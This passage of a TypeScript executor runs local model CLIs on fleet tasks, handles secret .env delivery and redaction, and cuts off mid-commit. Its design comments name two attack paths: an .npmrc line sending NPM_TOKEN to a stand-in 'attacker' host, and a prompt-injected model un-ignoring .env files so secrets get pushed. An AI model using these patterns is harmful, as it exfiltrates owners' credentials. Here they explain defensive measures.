import { statSync } from 'fs';
import { promises as fs } from 'fs';
import { tmpdir } from 'os';
import { dirname, isAbsolute, join, relative, resolve } from 'path';
import type {
	FleetAgentModelExecution,
	FleetAgentTaskGitResult,
	FleetAgentTaskMcpBridge,
	FleetAgentTaskMcpResult,
	FleetAgentTaskModelResult,
	FleetAgentTaskPayload,
	FleetAgentTaskQuestion,
	FleetAgentTaskResult,
	FleetAgentTaskStep,
	FleetJobView,
	FleetRunEnvFileContent,
	FleetRunEnvFileRequestRef,
	FleetTaskWorkspaceDescriptor,
	FleetTaskWorkspaceMountDescriptor,
	FleetTaskWorkspaceSpec,
	TaskCheckResult
} from '@ever-works/contracts';
import type { WorkspacePublishFence } from '@ever-works/plugin';
import {
	FLEET_AGENT_TASK_MAX_SETUP_STEPS,
	FLEET_AGENT_TASK_MAX_STEPS,
	FLEET_AGENT_TASK_SETUP_DEFAULT_TIMEOUT_SEC,
	FLEET_AGENT_TASK_SETUP_LOG_TAIL_BYTES,
	FLEET_AGENT_TASK_SETUP_MAX_TIMEOUT_SEC,
	FLEET_RUN_SECRETS_UNAVAILABLE_REASON,
	FLEET_RUN_SECRETS_UNRESOLVED_REASON,
	FleetAgentExecutionError,
	normalizeFleetAgentModelExecution,
	REPO_DECLARED_COMMAND_ID_PREFIX
} from '@ever-works/contracts';
import { FleetClientError } from '../fleet-client';
import {
	fitNodeOutcomeToResultBudget,
	normalizeChecks,
	runNodeCommandStep,
	type AcceptanceChecksIo,
	type NodeCheckResult,
	type NodeCommandLimits,
	type WireCheck
} from './acceptance-checks';
import { resolveCommandRoot, type CommandRootFs } from './command-roots';
import {
	collectOwnerQuestion,
	defaultQuestionFs,
	discardOwnerQuestion,
	type AgentTaskQuestionFs
} from './agent-task-question';
import {
	assertMountGrantsInCommand,
	buildModelCliCommand,
	buildModelCliStep,
	ModelCliCommandError,
	parseModelCliResult,
	redactCommandResult,
	type ModelCliPaths,
	MODEL_CLI_MAX_OUTPUT_BYTES
} from './model-cli';
import { startMcpLoopbackProxy, type McpBridgeFetch, type McpLoopbackProxy } from './mcp-bridge';
import type { Logger } from '../logger';
import type { FleetTaskWorkspaceErrorCode } from '../workspaces/fleet-task-workspace';
import { extractRunEnvSecretValues } from '../workspaces/run-env-files';

/**
 * The `agent-task` executor — the node's general job kind.
 *
 * ## Why a second kind
 *
 * `acceptance-checks` made a node capacity for the GATE. It could not
 * make it capacity for ordinary work: no matter how many machines an
 * owner enrolled, a Task's run could never land on one, because the only
 * kind the protocol knew about was "score these checks". `agent-task` is
 * the kind the agent-run dispatch path enqueues whenever the resolved
 * job runtime for the owner is the fleet.
 *
 * ## Two execution modes, one runner
 *
 * **Legacy `steps`** — the platform hands the node ordered shell
 * commands (rendered from the operator's `FLEET_NODE_AGENT_TASK_COMMAND`
 * template) and the node reports each exit code. Byte-for-byte the
 * behaviour this kind shipped with.
 *
 * **`execution` (agent execution v2)** — the platform hands the node the
 * agent's assembled instructions and the node runs a LOCAL model CLI
 * (Claude Code / Codex) on them inside the task's isolated worktree,
 * then grades the dispatch-frozen acceptance checks, then commits and
 * pushes the task branch. The model loop happens on the PC, with the
 * PC's own CLI login; only the outcome travels back. See `model-cli.ts`.
 *
 * Both modes spawn through the SAME command runner
 * (`runNodeCommandStep`), so the env scrub, the timeout policy, the
 * cancellation path and the verdict rules cannot drift between them —
 * or between this kind and `acceptance-checks`.
 *
 * **Owner question (self-build slice Q)** — a model that needs a decision
 * only the Task owner can make writes `.ever-works/QUESTION.md` in the
 * worktree and stops. After the model step (before the checks, before
 * any Git command) the node reads and REMOVES that file and reports it
 * as `result.question`; a stale file from an earlier attempt is
 * discarded before the model runs so only this run's words count. A
 * question is not a failure and never makes the job `failed` on its
 * own: the node still reports the model, check and git verdicts
 * honestly, and the platform decides what a paused run means. See
 * `agent-task-question.ts`.
 *
 * ## Failure posture
 *
 * A job with nothing to run — no `execution` and no `steps` — is FAILED,
 * naming the operator knob that would have supplied them. Reporting
 * success for a job that did nothing would recreate, one layer down,
 * exactly the silent-empty-queue failure this kind exists to remove.
 */

/** Overall verdict for one `agent-task` job. */
export type AgentTaskStatus = 'succeeded' | 'failed';

/** What the node reports for one `agent-task` job — the shared wire contract. */
export type AgentTaskOutcome = FleetAgentTaskResult;

export class AgentTaskPayloadError extends Error {
	constructor(message: string) {
		super(message);
		this.name = 'AgentTaskPayloadError';
	}
}

/** Commit subject when the job names none. */
export function defaultAgentTaskCommitMessage(taskId: string): string {
	return `feat(task): ${taskId} agent run output`;
}

/** Filesystem seam for the model step's scratch files. */
export interface AgentTaskScratchFs {
	/**
	 * Create a fresh, private, UNIQUE directory under `root` for one job
	 * and return its path. The production implementation uses `mkdtemp`
	 * beneath a `0700` root: a predictable path could be pre-created as a
	 * symlink by anything sharing the temp dir, and the instructions
	 * would then be written wherever it pointed.
	 */
	createScratchDir(root: string, prefix: string): Promise<string>;
	writeFile(path: string, content: string): Promise<void>;
	/**
	 * Null when the file does not exist.
	 *
	 * Implementations MUST bound what they load. The model CLI's stdout is
	 * redirected here by the shell, so its size is set by the CLI, not by us
	 * — see {@link MODEL_CLI_MAX_OUTPUT_BYTES}.
	 */
	readFile(path: string): Promise<string | null>;
	remove(path: string): Promise<void>;
}

/** Injected so the executor is testable without spawning processes. */
export interface AgentTaskIo extends AcceptanceChecksIo {
	/** Directory used when the job carries no `workspacePath`. */
	defaultWorkspacePath?: string;
	/**
	 * The node's disk floor, applied to a workspace the PROVISIONER never
	 * sees: a payload carrying `workspacePath`, or carrying neither field
	 * (which runs in the node's own working directory).
	 *
	 * Absent means no floor is enforced on that path — the same "the
	 * control was never asked for" case as an unwired probe. Present, it
	 * throws a `FleetTaskWorkspaceError` with code `disk-low`, which
	 * `isProvisionDeclined` treats as a deferral exactly like the
	 * provisioner's own refusal.
	 *
	 * A deferral rather than a failure, deliberately, and unlike the
	 * lease-gate case in `judgeDiskFloor` it cannot idle the node: the
	 * lease gate measures the FLEET root's volume and cannot know about
	 * this one, so a node whose payload volume is full keeps leasing. What
	 * bounds it is the job's own attempt budget — it fails after
	 * `maxAttempts` either way, and deferring at least saves three runs'
	 * worth of model spend on a volume that was going to die inside the
	 * first git or npm step. The reason reaches the node's log through
	 * `settleDeferred`.
	 */
	checkWorkspaceHeadroom?: (path: string, signal?: AbortSignal) => Promise<void>;
	/** Repository/worktree adapter supplied by the node composition root. */
	provisionWorkspace?: (
		taskId: string,
		spec: FleetTaskWorkspaceSpec,
		signal?: AbortSignal
	) => Promise<FleetTaskWorkspaceDescriptor>;
	/**
	 * Commit + push adapter over the provisioned worktree. Absent means the
	 * node cannot finalize a repository run; a job that asked for a commit
	 * then fails naming the gap rather than silently leaving work behind.
	 */
	finalizeWorkspace?: (
		taskId: string,
		descriptor: FleetTaskWorkspaceDescriptor,
		opts: { commitMessage: string; push: boolean; publishFence?: WorkspacePublishFence },
		signal?: AbortSignal
	) => Promise<{
		pushed: boolean;
		headSha: string | null;
		empty: boolean;
		changedFiles?: number;
		publishWithheld?: string;
	}>;
	/**
	 * Multi-repo Task workspaces (self-build slice C): commit + push adapter
	 * over the writable mounts of the provisioned workspace, one verdict per
	 * mount. Absent means the node cannot finalize mounts; a run whose
	 * workspace has writable mounts then fails naming the gap.
	 *
	 * Fenced by the same lease as the primary branch: every mount is another
	 * remote this run may no longer be entitled to write to, and a stale
	 * node publishing half a multi-repo change is worse than publishing
	 * none of it.
	 */
	finalizeMounts?: (
		taskId: string,
		descriptor: FleetTaskWorkspaceDescriptor,
		opts: { commitMessage: string; push: boolean; publishFence?: WorkspacePublishFence },
		signal?: AbortSignal
	) => Promise<
		Array<{
			repositoryId: string;
			mountDir: string;
			branch: string;
			baseSha: string;
			pushed: boolean;
			headSha: string | null;
			empty: boolean;
			changedFiles?: number;
			error?: string;
			publishWithheld?: string;
		}>
	>;
	/**
	 * Called once the run is over — success, failure or abort alike — so the
	 * provisioner can drop the on-disk lease it took on the worktree (and its
	 * mounts) and stamp the workspace's last use. Absent on callers whose
	 * provisioner keeps no lease. Never decides the verdict: a release that
	 * fails is logged by the caller, not reported as the job's failure.
	 */
	releaseWorkspace?: (taskId: string, descriptor: FleetTaskWorkspaceDescriptor) => Promise<void>;
	/**
	 * Run secrets (self-build slice Y) — fetch the decrypted seed `.env`
	 * files this run's repositories declared, over the node-authenticated
	 * job channel, while this node still holds the lease.
	 *
	 * Absent on a caller that holds no lease (the cloud runner). A job
	 * whose workspace NAMES env files and finds this absent fails naming
	 * the gap: starting it would run the model against an environment the
	 * operator did not configure, and every database-touching check would
	 * go red for a reason nothing on the run explains.
	 */
	fetchRunEnvFiles?: (refs: readonly FleetRunEnvFileRequestRef[]) => Promise<readonly FleetRunEnvFileContent[]>;
	/**
	 * Place the fetched files 0600 inside the checkouts they belong to.
	 * Throws (after removing whatever already landed) rather than
	 * delivering a partial set.
	 */
	writeRunEnvFiles?: (
		taskId: string,
		descriptor: FleetTaskWorkspaceDescriptor,
		files: ReadonlyArray<{ mountDir?: string; path: string; content: string }>
	) => Promise<number>;
	/**
	 * Delete every env file this run was given. Called from the SAME
	 * `finally` that releases the workspace, so it covers success, a
	 * reported failure, a thrown model step, and an abort — an operator
	 * cancel and a lapsed lease both arrive as one. Never decides the
	 * verdict: a cleanup that fails is logged, not reported.
	 */
	removeRunEnvFiles?: (taskId: string, descriptor: FleetTaskWorkspaceDescriptor) => Promise<number>;
	/**
	 * The lease deadline this run is publishing under, resolved as LATE as
	 * possible — right before the commit/push — because the keep-alive
	 * advances it on every renewal and a model step outlives four or five
	 * of those. Absent on callers that hold no lease, which is exactly the
	 * shape the cloud runner has, and then the push is unfenced as before.
	 *
	 * Async because resolving it re-asks the platform whether this node
	 * still holds the claim. That question needs the network, so its answer
	 * is a bonus, not the guarantee: the deadline it returns is fenced
	 * against locally either way.
	 */
	publishFence?: () => Promise<WorkspacePublishFence | null> | WorkspacePublishFence | null;
	/**
	 * Called when the provider declined to publish. The caller decides what
	 * that means for the JOB — this executor only reports it — because a run
	 * that produced no branch has not reached a verdict anyone should record
	 * as terminal.
	 */
	onPublishWithheld?: (reason: string) => void;
	/**
	 * Called when the node DECLINED to start the run before anything was
	 * written: the workspace volume is below the disk floor, or the worktree
	 * is being reclaimed by the workspace reaper at this very moment. Like
	 * `onPublishWithheld`, this executor only reports it; the caller decides
	 * what it means for the job (the runtime hands it back unsettled so the
	 * platform re-offers it to a node with room).
	 */
	onProvisionDeclined?: (reason: string) => void;
	/** Model CLIs this node may drive, resolved once at startup. */
	modelCli?: ModelCliPaths;
	/**
	 * Self-build slice Z (EW-796) — the node's redacting logger.
	 *
	 * Optional and additive: an absent logger simply means the bridge's
	 * diagnostics go nowhere. When present, the run token is registered
	 * with `protect()` the moment it is minted, so it is scrubbed out of
	 * every line this executor could ever emit — including the text of an
	 * error thrown by something that had the token in scope.
	 */
	logger?: Logger;
	/**
	 * Self-build slice Z (EW-796) — the platform side of the MCP bridge.
	 *
	 * Absent means this caller cannot mint run credentials (the cloud
	 * runner, and every unit test that does not exercise the bridge), and
	 * a job whose payload asks for MCP then runs exactly as it always did
	 * and reports `mcp: { enabled: false }`. Present, it is the node's
	 * authenticated job client: `mint` proves this node holds the lease
	 * and returns a short-lived token, `revoke` drops it early.
	 *
	 * The token returned by `mint` is handled ONLY in memory by
	 * {@link runModelStep} — it is never written to the scratch config,
	 * never put in the child's environment, and never logged.
	 */
	mcpBridge?: {
		mint: (jobId: string) => Promise<{ token: string; expiresAt: string; serverUrl: string }>;
		revoke?: (jobId: string) => Promise<void>;
		/** Injected `fetch` for the proxy's upstream calls (tests). */
		fetchFn?: McpBridgeFetch;
		/** Test seam: replaces the real listener. */
		start?: typeof startMcpLoopbackProxy;
		/**
		 * Test seam for the RENEWAL timer. Production uses `setInterval`
		 * (unref'd, so a stray timer can never hold the process open).
		 */
		scheduleRenewal?: (fn: () => void, intervalMs: number) => { cancel: () => void };
	};
	/** Root for per-job scratch files (instructions / CLI output). */
	scratchRoot?: string;
	scratchFs?: AgentTaskScratchFs;
	/**
	 * Self-build slice Q: reads / removes the owner-question file in the
	 * worktree (and in writable mounts). Defaults to `node:fs`.
	 */
	questionFs?: AgentTaskQuestionFs;
	/**
	 * EW-807: the `lstat` / `realpath` seam {@link resolveCommandRoot} uses
	 * to PROVE a mount's path is a real, unlinked directory before a
	 * command is spawned in it. Defaults to `node:fs`.
	 */
	commandRootFs?: CommandRootFs;
	platform?: NodeJS.Platform;
}

/**
 * Run one `agent-task` job to a reported verdict.
 *
 * Throws only on a payload the node CANNOT honour (no task id, nothing
 * to run, a workspace that does not resolve, a model CLI it does not
 * have). A step that exits nonzero, times out or cannot be spawned is a
 * normal result — that is a verdict the platform asked for, not an
 * error in the node.
 */
export async function runAgentTaskJob(
	job: FleetJobView,
	io: AgentTaskIo = {},
	signal?: AbortSignal
): Promise<AgentTaskOutcome> {
	throwIfAgentTaskAborted(signal);
	const payload = job.payload as FleetAgentTaskPayload | null;
	if (!payload || typeof payload !== 'object') {
		throw new AgentTaskPayloadError('Job payload is missing');
	}

	const taskId = typeof payload.taskId === 'string' ? payload.taskId.trim() : '';
	if (!taskId) {
		throw new AgentTaskPayloadError('Job payload has no taskId');
	}
	const runId = typeof payload.runId === 'string' && payload.runId.trim() ? payload.runId.trim() : null;

	const execution = resolveExecution(payload);
	const steps = normalizeAgentTaskSteps(payload.steps);
	if (!execution && steps.length === 0) {
		throw new AgentTaskPayloadError(
			'Fleet agent-task job carries no executable steps and no model execution. ' +
				'Set FLEET_NODE_AGENT_TASK_COMMAND on the platform, or switch the fleet runtime to model-cli execution.'
		);
	}
	// Run secrets (self-build slice Y): the run's per-repository env grants
	// live on the model-execution block, and they belong to the RUN, not to
	// one command. The acceptance checks are the reason the feature exists —
	// `pnpm test` is what needs `DATABASE_URL` — and the platform-authored
	// steps run in the same workspace at the same trust level, so the grant
	// is stamped onto all of them here, once, rather than trusted to arrive
	// per entry (the checks are frozen from the Task and carry none).
	const runEnvGrants = Array.isArray(execution?.envGrants) ? execution.envGrants : [];
	const checks = withRunEnvGrants(resolveAcceptanceChecks(payload), runEnvGrants);
	const grantedSteps = withRunEnvGrants(steps, runEnvGrants);
	// Setup phase (EW-807): the install gets the run's grants on the same
	// footing as everything else — a private registry token is exactly what
	// an install needs, and it is the one command in the run that cannot
	// work without one.
	const setup = withRunEnvGrants(normalizeAgentTaskSetup(payload.setup), runEnvGrants);

	let workspaceResolution: { path: string; descriptor: FleetTaskWorkspaceDescriptor | null };
	try {
		workspaceResolution = await resolveAgentTaskWorkspace(taskId, payload, io, signal);
	} catch (error) {
		// A refusal that is about this MACHINE right now (no disk headroom,
		// the reaper mid-removal) rather than about the job: report it so the
		// caller can hand the job back, then let it propagate as it always did.
		if (isProvisionDeclined(error)) io.onProvisionDeclined?.(error.message);
		throw error;
	}
	try {
		// Run secrets (self-build slice Y): the decrypted `.env` files land
		// AFTER provisioning (so the Git exclude rules are already written)
		// and BEFORE the model step. A delivery that cannot be completed
		// throws HERE, which fails the run closed — the alternative is a
		// model working against an environment the operator did not
		// configure and a suite that goes red for reasons nothing explains.
		// The returned values are the secrets that now live in the checkout.
		// They are held for the length of the run for ONE purpose: scrubbing
		// them back out of everything the node reports. Nothing else reads
		// this array, and it never leaves the process.
		const runSecretValues = await provisionRunEnvFiles(taskId, payload, workspaceResolution.descriptor, io);
		return await runResolvedAgentTask(
			{
				job,
				payload,
				taskId,
				runId,
				execution,
				steps: grantedSteps,
				setup,
				checks,
				workspaceResolution,
				runEnvGrants,
				runSecretValues
			},
			io,
			signal
		);
	} finally {
		// Whatever the verdict — and whatever threw — the lease the
		// provisioner took on the worktree is dropped, or the workspace
		// reaper would treat this checkout as busy until the process dies.
		//
		// Run secrets ride the SAME `finally`, and deliberately BEFORE the
		// release: success, a reported failure, a thrown model step, an
		// operator cancel and a lapsed lease (both delivered as an aborted
		// signal) all pass through here. The one path it cannot cover is a
		// hard kill, which is why the provisioner also sweeps at provision
		// time and the files are Git-excluded meanwhile.
		if (workspaceResolution.descriptor && io.removeRunEnvFiles) {
			await io.removeRunEnvFiles(taskId, workspaceResolution.descriptor).catch(() => undefined);
		}
		if (workspaceResolution.descriptor && io.releaseWorkspace) {
			await io.releaseWorkspace(taskId, workspaceResolution.descriptor).catch(() => undefined);
		}
	}
}

/**
 * Fetch and place this run's seed `.env` files.
 *
 * No-op — and no round trip — for a workspace that declares none, which is
 * every workspace before this slice.
 *
 * Fails CLOSED on every other outcome: a missing seam, a refused fetch, a
 * reference the platform could not resolve, or a response missing a file
 * that was asked for. The thrown message carries a STABLE reason token and
 * names the repository row and path at most; it never carries a value,
 * because it lands on the job row, the Task page and the API log.
 */
async function provisionRunEnvFiles(
	taskId: string,
	payload: FleetAgentTaskPayload,
	descriptor: FleetTaskWorkspaceDescriptor | null,
	io: AgentTaskIo
): Promise<string[]> {
	const refs = payload.workspace?.envFilesRef ?? [];
	if (refs.length === 0) return [];
	if (!descriptor) {
		throw new AgentTaskPayloadError(
			`${FLEET_RUN_SECRETS_UNAVAILABLE_REASON}: the job asks for repository env files but no repository workspace was provisioned`
		);
	}
	if (!io.fetchRunEnvFiles || !io.writeRunEnvFiles) {
		throw new AgentTaskPayloadError(
			`${FLEET_RUN_SECRETS_UNAVAILABLE_REASON}: this node cannot fetch repository env files (no leased job channel is wired for this run)`
		);
	}

	let fetched: readonly FleetRunEnvFileContent[];
	try {
		fetched = await io.fetchRunEnvFiles(
			refs.map((ref) => ({ repoConnectionId: ref.repoConnectionId, paths: [...ref.paths] }))
		);
	} catch (error) {
		// A stale lease must keep its own identity: the worker reads it as
		// "abort, and do not report", and collapsing it here would turn a
		// void claim into a reported failure.
		if (error instanceof FleetClientError && error.kind === 'stale-lease') throw error;
		throw new AgentTaskPayloadError(
			`${FLEET_RUN_SECRETS_UNAVAILABLE_REASON}: ${error instanceof Error ? error.message : String(error)}`
		);
	}

	// Index by (row, path) and prove EVERY requested file came back. A
	// silently short response is exactly the partial environment this
	// feature exists to prevent, and it would otherwise look like success.
	const byKey = new Map<string, string>();
	for (const file of fetched) byKey.set(`${file.repoConnectionId}\u0000${file.path}`, file.content);
	const writes: Array<{ mountDir?: string; path: string; content: string }> = [];
	for (const ref of refs) {
		for (const path of ref.paths) {
			const content = byKey.get(`${ref.repoConnectionId}\u0000${path}`);
			if (typeof content !== 'string') {
				throw new AgentTaskPayloadError(
					`${FLEET_RUN_SECRETS_UNRESOLVED_REASON}: repository ${ref.repoConnectionId} did not deliver '${path}'`
				);
			}
			writes.push({ ...(ref.mountDir ? { mountDir: ref.mountDir } : {}), path, content });
		}
	}

	try {
		await io.writeRunEnvFiles(taskId, descriptor, writes);
	} catch (error) {
		throw new AgentTaskPayloadError(
			`${FLEET_RUN_SECRETS_UNAVAILABLE_REASON}: ${error instanceof Error ? error.message : String(error)}`
		);
	}
	// The VALUES inside the delivered files, for the redactor only. The
	// node's logger is handed each file whole (`FleetJobClient`), which
	// only ever matches a log line that reproduces the entire file; a
	// connection string does not leak that way — a failing `pnpm test`
	// prints the one line it read. So the per-variable values are extracted
	// here and scrubbed out of every step, check and model result before
	// the outcome is built.
	const values = new Set<string>();
	for (const write of writes) {
		for (const value of extractRunEnvSecretValues(write.content)) values.add(value);
	}
	return [...values];
}

/** Provision refusals that clear on their own and say nothing about the work. */
const DECLINED_PROVISION_CODES: ReadonlySet<FleetTaskWorkspaceErrorCode> = new Set<FleetTaskWorkspaceErrorCode>([
	'disk-low',
	'workspace-busy'
]);

/**
 * A `FleetTaskWorkspaceError` the provisioner threw BEFORE writing a byte,
 * for a reason that is about this machine at this moment. Matched by name
 * and code, like every other cross-module error in the node, so a
 * duplicated class identity can never turn a deferral into a terminal
 * failure.
 */
function isProvisionDeclined(error: unknown): error is Error & { code: FleetTaskWorkspaceErrorCode } {
	if (!(error instanceof Error) || error.name !== 'FleetTaskWorkspaceError') return false;
	const code = (error as { code?: unknown }).code;
	return typeof code === 'string' && DECLINED_PROVISION_CODES.has(code as FleetTaskWorkspaceErrorCode);
}

interface ResolvedAgentTask {
	job: FleetJobView;
	payload: FleetAgentTaskPayload;
	taskId: string;
	runId: string | null;
	execution: FleetAgentModelExecution | null;
	steps: WireCheck[];
	/** Dispatch-frozen setup phase (EW-807); runs first, budgeted apart. */
	setup: WireCheck[];
	checks: WireCheck[];
	workspaceResolution: { path: string; descriptor: FleetTaskWorkspaceDescriptor | null };
	/** Env names this run was granted; their VALUES are scrubbed from every report. */
	runEnvGrants: readonly string[];
	/**
	 * The VALUES inside the run's delivered `.env` files. Scrubbed out of
	 * every step, check and model result, exactly like a granted name's
	 * value — the difference is only that these live in no environment, so
	 * they have to be carried rather than looked up.
	 */
	runSecretValues: readonly string[];
}

/**
 * Stamp the run's env grants onto each command. Case-insensitive, because
 * Windows env names are; the node re-derives what it will actually honour
 * in `buildNodeCheckEnv`, so this only decides what is OFFERED.
 *
 * EXCEPT for a command the REPOSITORY authored (EW-807).
 *
 * An env grant is an operator saying "let this repository's own commands
 * read this credential" — a `NPM_TOKEN` for a private registry, a
 * `DATABASE_URL` for a test suite. The author of those commands was, until
 * `spec.tasks` was read, always a Work member with settings or Task-edit
 * rights. A repository-declared command's author is anyone who can land a
 * commit or a PR branch.
 *
 * And an allow-list over command STRINGS cannot bound where a granted
 * value goes, because the allow-listed string delegates: a repository that
 * commits an `.npmrc` containing `//attacker/:_authToken=${NPM_TOKEN}`
 * has the operator's registry token posted to it by the exactly-matching,
 * exactly-allow-listed `pnpm install --frozen-lockfile`. Nothing about
 * that command is wrong; the file beside it is.
 *
 * So the grant follows AUTHORSHIP, not the phase. Owner-authored commands
 * keep every grant they had; repository-declared ones — the ids the
 * platform mints with {@link REPO_DECLARED_COMMAND_ID_PREFIX}, a prefix an
 * owner-authored id cannot spell (`/` is outside
 * `ACCEPTANCE_CHECK_ID_PATTERN`) — get none. An owner who wants their
 * install to reach a private registry authors that install in the Work's
 * own setup defaults, where they are the author of both halves.
 *
 * Re-derived on the node rather than trusted from the payload, the same
 * way `buildNodeCheckEnv` re-derives the un-grantable core: this is the
 * machine the credential actually lives on.
 */
function withRunEnvGrants(checks: readonly WireCheck[], runEnvGrants: readonly string[]): WireCheck[] {
	if (runEnvGrants.length === 0) return [...checks];
	return checks.map((check) => {
		if (isRepositoryAuthoredCommand(check)) {
			// Not "merged with an empty list" — the key is REMOVED, so a
			// future payload that put grants here could not reach the env
			// builder through this path either.
			const withoutGrants: WireCheck = { ...check };
			delete withoutGrants.envGrants;
			return withoutGrants;
		}
		const merged: string[] = [];
		const seen = new Set<string>();
		for (const name of [...(check.envGrants ?? []), ...runEnvGrants]) {
			if (typeof name !== 'string') continue;
			const upper = name.toUpperCase();
			if (seen.has(upper)) continue;
			seen.add(upper);
			merged.push(name);
		}
		return { ...check, envGrants: merged };
	});
}

/** A command the repository's own `.works/works.yml` declared (EW-807). */
export function isRepositoryAuthoredCommand(command: Pick<WireCheck, 'id'>): boolean {
	return typeof command.id === 'string' && command.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX);
}

/** The run proper, once the payload is validated and the workspace resolved. */
async function runResolvedAgentTask(
	context: ResolvedAgentTask,
	io: AgentTaskIo,
	signal?: AbortSignal
): Promise<AgentTaskOutcome> {
	const { job, payload, taskId, runId, execution, steps, setup, checks, workspaceResolution, runEnvGrants } = context;
	const runSecretValues = context.runSecretValues;
	throwIfAgentTaskAborted(signal);

	// Every command's log tail is scrubbed of the values behind the names
	// this run was granted, on the same footing as the model summary. A
	// failing `pnpm test` prints its connection string, and that tail lands
	// in the job result the platform stores.
	// `runSecretValues` rides the same seam: the contents of the delivered
	// `.env` files are in no environment to look up, and a failing suite
	// prints the connection string it read from one.
	//
	// Resolved before ANY command runs (EW-807): the setup phase is the
	// first thing to spawn and the most likely thing to print a registry
	// token in a stack trace.
	const reported = (result: NodeCheckResult): NodeCheckResult =>
		redactCommandResult(result, runEnvGrants, io.parentEnv, runSecretValues);

	const questionFs = io.questionFs ?? defaultQuestionFs;
	const questionMounts = (workspaceResolution.descriptor?.mounts ?? []).map((mount) => ({
		mountDir: mount.mountDir,
		path: mount.path,
		writable: mount.writable
	}));

	const failures: string[] = [];

	// ── SETUP PHASE (EW-807) ────────────────────────────────────────────
	//
	// FIRST, before the model: a node-provisioned worktree is a bare `git
	// worktree` with no `node_modules`, and every command after this one —
	// the model's own type-checks included — fails without it.
	//
	// Its own budget (`SETUP_COMMAND_LIMITS`), its own log tail, and its own
	// reported block. A red setup is NOT a red gate: it means the machine
	// was never made ready, so no verdict after it would have described the
	// change. The node stops rather than spending a model call and a suite
	// run producing failures that all say "cannot find module".
	const setupResults = await runCommandPhase(setup, context, io, signal, SETUP_COMMAND_LIMITS, reported);
	const setupStatus: 'green' | 'red' | 'none' =
		setup.length === 0
			? 'none'
			: setup.some((step, index) => step.required !== false && setupResults[index].status !== 'green')
				? 'red'
				: 'green';
	const setupBlocked = setupStatus === 'red';
	if (setupBlocked) {
		failures.push(describeSetupFailure(setup, setupResults));
	}

	if (execution && !setupBlocked) {
		// The worktree is reused in place across runs (no clean, no
		// re-clone): a question file left by an aborted attempt, or by the
		// previous run whose question the owner already answered, must never
		// become a phantom question — nor context the model reads.
		await discardOwnerQuestion(workspaceResolution.path, questionFs, signal);
		for (const mount of questionMounts) {
			if (mount.writable) await discardOwnerQuestion(mount.path, questionFs, signal);
		}
		throwIfAgentTaskAborted(signal);
	}

	let model: FleetAgentTaskModelResult | null = null;
	// Slice Z: the bridge verdict rides alongside the model verdict — it is
	// reported, never a failure. A run whose platform tools did not come up
	// is a run without tools, not a broken run.
	let mcp: FleetAgentTaskMcpResult | null = null;
	// EW-807: a blocked setup skips the model entirely. With no dependencies
	// installed the model step would fail for a reason that has nothing to do
	// with the change, which is the failure this slice exists to stop.
	if (execution && !setupBlocked) {
		const modelStep = await runModelStep(
			job.id,
			execution,
			workspaceResolution.path,
			workspaceResolution.descriptor?.mounts,
			resolveMcpBridgeSpec(payload),
			io,
			signal,
			runSecretValues
		);
		model = modelStep.model;
		mcp = modelStep.mcp;
		throwIfAgentTaskAborted(signal);
		if (model.status !== 'succeeded') {
			failures.push(describeModelFailure(model));
		}
	}

	// Self-build slice Q: read the owner question BEFORE the checks and
	// BEFORE finalize, so `git add -A` can never stage the file. A question
	// NEVER pushes to `failures` — the platform decides what a paused run
	// means, and the model / check / git verdicts below stay honest.
	let question: FleetAgentTaskQuestion | null = null;
	if (execution && !setupBlocked) {
		question = await collectOwnerQuestion(
			{ primaryPath: workspaceResolution.path, mounts: questionMounts },
			questionFs,
			signal
		);
		throwIfAgentTaskAborted(signal);
	}

	const stepResults = setupBlocked ? [] : await runCommandPhase(steps, context, io, signal, undefined, reported);
	const anyRequiredStepFailed =
		!setupBlocked && steps.some((step, index) => step.required !== false && stepResults[index].status !== 'green');
	if (anyRequiredStepFailed) {
		failures.push('a required command step did not pass');
	}

	const checkResults = setupBlocked ? [] : await runCommandPhase(checks, context, io, signal, undefined, reported);
	// `none`, never `red`, when setup blocked: the gate did not fail, it
	// never ran. Reporting a red gate for an install failure is exactly the
	// lie this slice removes — it makes a fleet pull request's checks read
	// as a judgement on the change when they are a judgement on the machine.
	const gateStatus: 'green' | 'red' | 'none' =
		setupBlocked || checks.length === 0
			? 'none'
			: checks.some((check, index) => check.required !== false && checkResults[index].status !== 'green')
				? 'red'
				: 'green';
	if (gateStatus === 'red') {
		failures.push('a required acceptance check did not pass');
	}

	// Run secrets (self-build slice Y): the delivered `.env` files come off
	// the disk BEFORE the first Git command, not only in the `finally`.
	//
	// The anchored `info/exclude` rule keeps `git add -A` from staging them,
	// but `info/exclude` is the LOWEST-precedence ignore source Git has: a
	// `.gitignore` in the worktree beats it, and the model has `acceptEdits`
	// over the whole checkout. A prompt-injected run that writes
	// `!/apps/api/.env` into a `.gitignore` would otherwise have the secret
	// committed and pushed by the node itself, into the owner's branch and
	// the pull request the platform opens. Nothing between here and the
	// commit reads the files — the model, the steps and the checks are all
	// done — so removing them now costs nothing and closes that channel.
	//
	// The `finally` still runs: this is the early half of the same deletion,
	// and it is idempotent.
	if (workspaceResolution.descriptor && io.removeRunEnvFiles) {
		await io.removeRunEnvFiles(taskId, workspaceResolution.descriptor).catch(() => undefined);
	}

	let git: FleetAgentTaskGitResult | null = null;
	let mountGit: FleetAgentTaskGitResult[] | null = null;
	// `!setupBlocked` (EW-807): the model never ran, so there is nothing to
	// commit — and a branch pushed for a run that did no work is a pull
	// request a human has to open to discover it is empty.
	const wantsCommit = payload.git?.commit !== false;
	if (execution && workspaceResolution.descriptor && wantsCommit && !setupBlocked) {
		// Resolved ONCE, here, for every publish this run makes. Late, because
		// the keep-alive advances the deadline on each renewal and a model step
		// outlives several — fencing against the value the job was leased with
		// would refuse nearly every run. Once, because the mounts and the
		// primary branch are written under the same claim and re-asking the
		// platform per repository would spend a round trip on an answer that
		// cannot have changed in between.
		const publishFence = (await io.publishFence?.()) ?? null;
		// Resolving the fence can itself learn the claim is gone and cancel
		// the run. Check before touching any repository: an abort arriving
		// here means no commit is wanted, in the mounts or the primary.
		throwIfAgentTaskAborted(signal);
		// Multi-repo (slice C): mounts first, the primary last, so the primary
		// pull request the platform opens can already link the others.
		mountGit = await finalizeMounts(taskId, workspaceResolution.descriptor, payload, io, publishFence, signal);
		for (const entry of mountGit ?? []) {
			if (entry.error) {
				failures.push(`git finalize failed for mount ${entry.mountDir ?? entry.repositoryId}: ${entry.error}`);
			} else if (entry.publishWithheld) {
				failures.push(
					`publish withheld for mount ${entry.mountDir ?? entry.repositoryId}: ${entry.publishWithheld}`
				);
				io.onPublishWithheld?.(entry.publishWithheld);
			}
		}
